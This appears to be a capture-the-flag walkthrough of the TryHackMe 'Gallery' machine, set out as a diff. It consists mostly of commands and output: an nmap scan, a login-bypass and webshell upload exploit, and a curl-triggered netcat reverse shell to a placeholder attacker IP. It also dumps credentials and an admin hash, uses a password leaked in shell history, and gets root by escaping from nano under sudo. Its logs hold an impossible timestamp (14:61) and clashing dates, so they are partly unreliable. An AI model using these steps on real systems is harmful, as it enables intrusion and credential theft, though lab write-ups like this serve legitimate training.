@@ -1,0 +1,160 @@
+NMAP recon:
+$ sudo nmap -A -T4 --open -p- 10.10.22.84 -oN Gallery.nmap 
+Nmap 7.92 scan initiated Sat Mar 11 14:55:38 2023 as: nmap -A -T4 --open -p- -oN Gallery.nmap 10.10.22.84
+Nmap scan report for 10.10.22.84
+Host is up (0.19s latency).
+Not shown: 65516 closed tcp ports (reset), 17 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Simple Image Gallery System
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=9/15%OT=80%CT=1%CU=40259%PV=Y%DS=5%DC=T%G=Y%TM=6322393
+OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O
+OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=F4B3%W2=
+OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSN
+OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 5 hops
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   38.77 ms  10.22.0.1
+2   ... 4
+5   238.24 ms 10.10.22.84
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Mar 11 14:61:29 2023 -- 1 IP address (1 host up) scanned in 110.99 seconds
+
+
+Searched for any exploit available for this version
+used one of the exploits
+https://www.exploit-db.com/exploits/50214
+
+Exploit
+
+$ python3 exploit.py
+TARGET = http://10.10.22.84/gallery/
+Login Bypass
+shell name TagoacenqkeozzskpfxLetta
+
+protecting user
+
+User ID : 1
+Firsname : Adminstrator
+Lasname : Admin
+Username : admin
+
+shell uploading
+- OK -
+Shell URL : http://10.10.22.84/gallery/uploads/1663192260_TagoacenqkeozzskpfxLetta.php?cmd=whoami
+
+Got a reverse shell
+$ curl 'http://10.10.22.84/gallery/uploads/1663192260_TagoacenqkeozzskpfxLetta.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20<THM IP>%20<PORT>%20%3E%2Ftmp%2Ff'
+
+$ cat initialize.php                                                                                          
+<?php
+$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
+
+if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
+if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
+if(!defined('dev_data')) define('dev_data',$dev_data);
+if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
+if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
+if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
+if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
+
+Got the admin hash
+
+MariaDB [gallery_db]> select * from users;
++----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
+| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
++----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
+|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1663192260_TagoacenqkeozzskpfxLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2022-09-14 21:51:08 |
++----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
+1 row in set (0.01 sec)
+
+$ cd /var/backups/mike_home_backup
+$ ls -la
+total 36
+drwxr-xr-x 5 root root 4096 May 24  2021 .
+drwxr-xr-x 3 root root 4096 Sep 14 20:23 ..
+-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
+-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
+-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
+drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
+-rwxr-xr-x 1 root root  807 May 24  2021 .profile
+drwxr-xr-x 2 root root 4096 May 24  2021 documents
+drwxr-xr-x 2 root root 4096 May 24  2021 images
+$ cat .bash_history                                                                                   
+cd ~
+ls
+ping 1.1.1.1
+cat /home/mike/user.txt
+cd /var/www/
+ls
+cd html
+ls -al
+cat index.html
+sudo -lb3stpassw0rdbr0xx
+clear
+sudo -l
+exit
+$ su mike -l                                                                                          
+Password: 
+mike@gallery:~$ cat user.txt
+THM{af05cd30bfed67849befd546ef}
+
+Checked for any other su permisissions
+
+$ sudo -l
+Matching Defaults entries for mike on gallery:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
+    
+$ cat /opt/rootkit.sh
+#!/bin/bash
+
+read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+
+# Execute your choice
+case $ans in
+    versioncheck)
+        /usr/bin/rkhunter --versioncheck ;;
+    update)
+        /usr/bin/rkhunter --update;;
+    list)
+        /usr/bin/rkhunter --list;;
+    read)
+        /bin/nano /root/report.txt;;
+    *)
+        exit;;
+esac
+
+mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
+Would you like to versioncheck, update, list or read the report ? read
+^R^X
+reset; sh 1>&0 2>&0
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# cat /root/root.txt
+THM{ba87e0dfe903adfa6b8b450ad7567bafde87}
